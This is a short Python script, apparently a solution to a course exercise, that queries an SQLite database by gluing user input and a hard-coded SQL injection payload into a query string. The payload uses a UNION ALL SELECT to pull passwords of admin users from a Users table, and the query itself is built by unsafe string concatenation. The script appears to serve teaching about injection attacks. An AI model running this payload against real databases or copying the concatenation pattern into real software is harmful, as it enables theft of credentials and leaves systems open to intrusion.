#!/usr/bin/env python3
import sys
import sqlite3
import string


def query():
    query = "1=1' UNION ALL SELECT password FROM Users WHERE admin=1 AND '1=1"
    return query


def main(argv):
    username = sys.argv[1]
    dbname = sys.argv[2]
    conn = sqlite3.connect(dbname)
    cursor = conn.cursor()
    response = cursor.execute("SELECT body FROM Tasks WHERE name='" + username + "' and body LIKE '%" + query() + "%'").fetchall()
    print('Found entries:')
    for r in response:
        print(r[0])


# This makes sure the main function is not called immediatedly
# when TMC imports this module
if __name__ == "__main__": 
    if len(sys.argv) != 3:
        print('usage: python %s username database' % sys.argv[0])
    else:
        main(sys.argv)
